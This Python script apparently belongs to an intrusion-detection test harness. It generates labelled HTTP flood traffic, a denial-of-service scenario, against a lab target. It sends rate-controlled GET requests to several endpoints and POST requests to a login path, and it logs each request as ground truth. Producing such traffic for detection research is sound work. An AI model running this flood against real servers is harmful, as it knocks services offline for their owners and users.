"""High-rate legitimate-looking HTTP GET/POST requests (application-layer DoS).

CIC-IDS2018 category: DoS (HTTP flood).
"""

from __future__ import annotations

import os
import random
import signal
import sys
import time

import requests

sys.path.insert(
    0,
    os.path.dirname(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    ),
)

from lib.tests.logger import GroundTruthLogger
from lib.tests.scenario_config import load_from_env, wait_for_target

RUNNING = True
ENDPOINTS = ["/", "/index.html", "/api/status", "/api/users", "/api/data"]


def _shutdown(signum, frame):
    global RUNNING
    RUNNING = False


def main() -> None:
    signal.signal(signal.SIGTERM, _shutdown)
    signal.signal(signal.SIGINT, _shutdown)

    cfg = load_from_env()
    target_ip = cfg.target.ip
    attacker_ip = os.environ.get("ATTACKER_IP", "172.28.0.11")
    duration = cfg.duration
    intensity = cfg.intensity  # requests per second

    base_url = f"http://{target_ip}:8080"
    log_path = f"/app/logs/http_flood_{attacker_ip}.csv"
    print(f"[http_flood] Target: {base_url}, Attacker: {attacker_ip}")
    print(f"[http_flood] Duration: {duration}s, Rate: {intensity} req/s")

    if not wait_for_target(target_ip, 8080):
        print("[http_flood] ERROR: target not reachable, aborting.")
        return

    with GroundTruthLogger(log_path, scenario="http_flood") as logger:
        count = 0
        end_time = time.time() + duration
        delay = 1.0 / max(intensity, 1)

        while RUNNING and time.time() < end_time:
            endpoint = random.choice(ENDPOINTS)
            try:
                if random.random() < 0.7:
                    requests.get(f"{base_url}{endpoint}", timeout=2)
                else:
                    requests.post(
                        f"{base_url}/api/login",
                        json={"user": "test", "pass": "x"},
                        timeout=2,
                    )
                count += 1
            except requests.RequestException:
                pass

            logger.log(
                src_ip=attacker_ip,
                dst_ip=target_ip,
                dst_port=8080,
                label="http_flood",
                extra=f"endpoint={endpoint}",
            )
            time.sleep(delay)

    print(f"[http_flood] Completed. Sent {count} HTTP requests.")


if __name__ == "__main__":
    main()
